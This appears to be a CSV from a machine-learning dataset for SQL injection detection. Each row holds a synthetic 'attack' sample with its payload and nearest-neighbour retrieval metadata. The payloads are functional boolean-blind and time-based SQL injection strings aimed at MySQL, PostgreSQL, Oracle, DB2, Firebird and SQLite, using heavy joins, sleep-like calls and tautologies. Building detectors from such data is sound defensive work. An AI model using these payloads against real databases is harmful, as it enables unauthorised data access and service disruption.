id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000029,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000776,0.10452286165807714
SMOTE_000030,attack,boolean,"1' where 7417  =  7417 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000702,0.11581466772150852
SMOTE_000031,attack,boolean,"1'   )    )    as rxhe where 3838  =  3838 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000178,0.33137861463151014
SMOTE_000032,attack,boolean,"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""oxxi""  =  ""oxxi",nearest_attack_euclidean,R000309,1.004920004749156
SMOTE_000033,attack,boolean,"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ajkb'  =  'ajkb",nearest_attack_euclidean,R000104,0.08869458556128831
SMOTE_000034,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000455,0.8430651741662629
SMOTE_000035,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",nearest_attack_euclidean,R000135,0.19795167182798173
SMOTE_000036,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000194,0.06189192409590653
SMOTE_000037,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000708,1.118317544431222
SMOTE_000038,attack,boolean,"1'  )   where 9226  =  9226 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000727,0.16920559402159505
SMOTE_000039,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000356,1.2775331410699076
SMOTE_000040,attack,boolean,"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000551,0.18261132818382808
SMOTE_000041,attack,boolean,"1'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000533,0.4030414566124353
SMOTE_000042,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000388,0.33166050775399736
SMOTE_000043,attack,boolean,"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000218,0.35328852217533013
SMOTE_000044,attack,boolean,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000282,0.12421922599006095
SMOTE_000045,attack,boolean,"1  )   where 7978  =  7978 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000656,0.8430371986836689
SMOTE_000046,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ireg' like 'ireg",nearest_attack_euclidean,R000499,0.4042887064803078
SMOTE_000047,attack,boolean,"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000511,1.1113765208042738
SMOTE_000048,attack,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",nearest_attack_euclidean,R000146,0.635020119353202
SMOTE_000049,attack,boolean,"1""  )   where 4660  =  4660 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000223,0.20547231846262357
SMOTE_000050,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6051  =  6051",nearest_attack_euclidean,R000087,0.7098447018458198
SMOTE_000051,attack,boolean,"1'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000243,0.059417274868856576
SMOTE_000052,attack,boolean,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000095,0.486368049881981
SMOTE_000053,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000034,0.002358647769452207
SMOTE_000054,attack,boolean,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey",nearest_attack_euclidean,R000735,0.034564186685096164
SMOTE_000055,attack,boolean,"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000690,0.038978267584294984
SMOTE_000056,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000356,1.2719148358484158
SMOTE_000057,attack,boolean,-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,nearest_attack_euclidean,R000145,0.04786018282032575
SMOTE_000058,attack,boolean,"1' in boolean mode  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000705,0.6349633479745949
SMOTE_000059,attack,boolean,1'   )    )    as oyad where 7161  =  7161 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000458,1.6929005203813692
SMOTE_000060,attack,boolean,"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv",nearest_attack_euclidean,R000431,0.5203790390432766
SMOTE_000061,attack,boolean,"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",nearest_attack_euclidean,R000269,0.29776658260724825
SMOTE_000062,attack,boolean,"-5644""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""evcf""  =  ""evcf",nearest_attack_euclidean,R000106,0.05065115622257293
SMOTE_000063,attack,boolean,"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""ampn"" like ""ampn",nearest_attack_euclidean,R000120,0.007012703430827132
SMOTE_000064,attack,boolean,"1%""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000568,0.015287615766311857
SMOTE_000065,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000489,0.5865841853199771
SMOTE_000066,attack,boolean,"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv",nearest_attack_euclidean,R000431,0.2901274515927957
SMOTE_000067,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""mofa"" like ""mofa",nearest_attack_euclidean,R000504,1.2798136759191154
SMOTE_000068,attack,boolean,"1' in boolean mode  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",nearest_attack_euclidean,R000023,0.6803218447490965
SMOTE_000069,attack,boolean,"1  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000494,0.6861596182142933
SMOTE_000070,attack,boolean,"-4849""   )    )    or   (  5005  =  9111  )  *9111 and    (    (   ""catv"" like ""catv",nearest_attack_euclidean,R000630,0.9188287747246616
SMOTE_000071,attack,boolean,"1   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   5683  =  5683",nearest_attack_euclidean,R000661,0.7484272393505288
SMOTE_000072,attack,boolean,"1  )   and make_set  (  8403  =  8403,8899  )   and   (  9761  =  9761",nearest_attack_euclidean,R000430,0.8351670025430991
SMOTE_000073,attack,boolean,"1%""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000113,0.9035396326470272
SMOTE_000074,attack,boolean,"1' where 6795  =  6795 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000065,0.18235855021913253
SMOTE_000075,attack,boolean,"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000158,0.49802114935309466
SMOTE_000076,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R000204,1.8621088971599842
SMOTE_000077,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""eboa"" like ""eboa",nearest_attack_euclidean,R000777,0.15893444019104208
SMOTE_000078,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000176,0.10188541949645065
SMOTE_000079,attack,boolean,1   )    )    as ztcn where 1043  =  1043 and 6305  =  5785--,nearest_attack_euclidean,R000418,0.6585864115181085
SMOTE_000080,attack,boolean,"1 where 5099  =  5099 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000558,0.40063046719891565
SMOTE_000081,attack,boolean,"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000576,0.2756751058490455
SMOTE_000082,attack,boolean,"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""vnso"" like ""vnso",nearest_attack_euclidean,R000227,0.044159417837030174
SMOTE_000083,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000489,0.5906511323131566
SMOTE_000084,attack,boolean,"-6160'   )    )     )   or make_set  (  1924  =  4415,4415  )   and    (    (     (  'hayr'  =  'hayr",nearest_attack_euclidean,R000324,0.2072339328913962
SMOTE_000085,attack,boolean,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""eslo"" like ""eslo",nearest_attack_euclidean,R000317,1.1700288648132364
SMOTE_000086,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000214,0.29485923130476926
SMOTE_000087,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",nearest_attack_euclidean,R000403,0.714942531094601
SMOTE_000088,attack,boolean,"1%'  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000628,0.43785164293175394
SMOTE_000089,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl",nearest_attack_euclidean,R000685,0.4010953783448004
SMOTE_000090,attack,boolean,"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",nearest_attack_euclidean,R000237,0.39618302192237936
SMOTE_000091,attack,boolean,"-7808""   )    )    as jgkk where 9230  =  9230 or elt  (  1032  =  1032,3623  )  --",nearest_attack_euclidean,R000605,0.9441067729712076
SMOTE_000092,attack,boolean,"1' where 7417  =  7417 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000702,0.45568266936163604
SMOTE_000093,attack,boolean,"-5904"" where 9782  =  9782 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",nearest_attack_euclidean,R000347,0.33242790415470735
SMOTE_000094,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000595,0.553555963231502
SMOTE_000095,attack,boolean,"1  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000494,0.32697695745590505
SMOTE_000096,attack,boolean,"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'obmu'  =  'obmu",nearest_attack_euclidean,R000308,0.017169890800097856
SMOTE_000097,attack,boolean,"1%""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000246,0.5440064954110416
SMOTE_000098,attack,boolean,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000013,0.2958065449555549
SMOTE_000099,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  1321  =  1321",nearest_attack_euclidean,R000374,1.3220356191616522
SMOTE_000100,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000169,0.36003192421132524
SMOTE_000101,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000569,1.305528750096964
SMOTE_000102,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000419,1.542152362554651
SMOTE_000103,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000004,1.196325492190718
SMOTE_000104,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'rfgj' like 'rfgj",nearest_attack_euclidean,R000492,0.429933475069929
SMOTE_000105,attack,boolean,"1%'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000509,0.9489327411586217
SMOTE_000106,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",nearest_attack_euclidean,R000501,0.4945105528795261
SMOTE_000107,attack,boolean,"1'||  (  select 'jlka' where 5436  =  5436 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000189,0.7649364614355256
SMOTE_000108,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000323,0.35458902656549807
SMOTE_000109,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",nearest_attack_euclidean,R000501,0.4479419828056187
SMOTE_000110,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000228,0.28572453871302156
SMOTE_000111,attack,boolean,"1'||  (  select 'flre' where 8250  =  8250 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000711,0.09545828313996957
SMOTE_000112,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",nearest_attack_euclidean,R000075,0.34283276240192645
SMOTE_000113,attack,boolean,"1""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000600,1.125963829777045
SMOTE_000114,attack,boolean,"1   )    )    as tbiq where 7159  =  7159 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000322,0.4292123600853406
SMOTE_000115,attack,boolean,"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""alvd"" like ""alvd",nearest_attack_euclidean,R000575,0.7472988575599964
SMOTE_000116,attack,boolean,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",nearest_attack_euclidean,R000507,1.868602354753902
SMOTE_000117,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # kfza",nearest_attack_euclidean,R000490,0.05330685840939201
SMOTE_000118,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000475,0.4728392717168897
SMOTE_000119,attack,boolean,1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,nearest_attack_euclidean,R000518,1.0720903618034798
SMOTE_000120,attack,boolean,"1   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000611,0.19112082786406506
SMOTE_000121,attack,boolean,"1  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000321,0.6086667684774073
SMOTE_000122,attack,boolean,"1""  )   as pgza where 8756  =  8756 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000351,0.00847335188843926
SMOTE_000123,attack,boolean,"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",nearest_attack_euclidean,R000513,0.9930867943816419
SMOTE_000124,attack,boolean,"1"" where 8379  =  8379 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000109,0.28209796410259
SMOTE_000125,attack,boolean,"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000288,0.030500758352246516
SMOTE_000126,attack,boolean,1'+  (  select 'hcqf' where 9956  =  9956 and   (  2993  =  4297  )  *4297  )  +',nearest_attack_euclidean,R000069,0.5577661152522955
SMOTE_000127,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000103,0.16994899748459064
SMOTE_000128,attack,boolean,select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000015,0.03263478361541194
SMOTE_000129,attack,boolean,"1'  )   as ezoa where 4915  =  4915 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000695,0.2820162694105257
SMOTE_000130,attack,boolean,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000362,0.3657158339035163
SMOTE_000131,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",nearest_attack_euclidean,R000664,0.2951212440693741
SMOTE_000132,attack,boolean,"1%""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000180,1.283171099312222
SMOTE_000133,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000653,0.32582465050743026
SMOTE_000134,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""jwzy""  =  ""jwzy",nearest_attack_euclidean,R000581,1.3845111778679748
